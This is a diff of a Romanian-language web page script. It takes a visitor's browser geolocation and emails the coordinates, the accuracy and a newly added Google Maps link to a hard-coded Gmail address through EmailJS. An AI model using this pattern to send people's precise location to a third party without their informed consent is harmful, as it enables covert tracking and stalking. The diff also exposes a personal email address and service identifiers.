@@ -50,10 +50,11 @@
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
+                    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                     
                     const templateParams = {
                         user_email: "ciprianionut.exe17@gmail.com",
-                        message: `Latitudine: ${latitude}, Longitudine: ${longitude}, Precizie: ${accuracy}m`
+                        message: `Latitudine: ${latitude}, Longitudine: ${longitude}, Precizie: ${accuracy}m\n\nVezi locația pe hartă: ${mapsLink}`
                     };
                     
                     emailjs.send("service_ar3ptv9", "template_er5zc5m", templateParams)
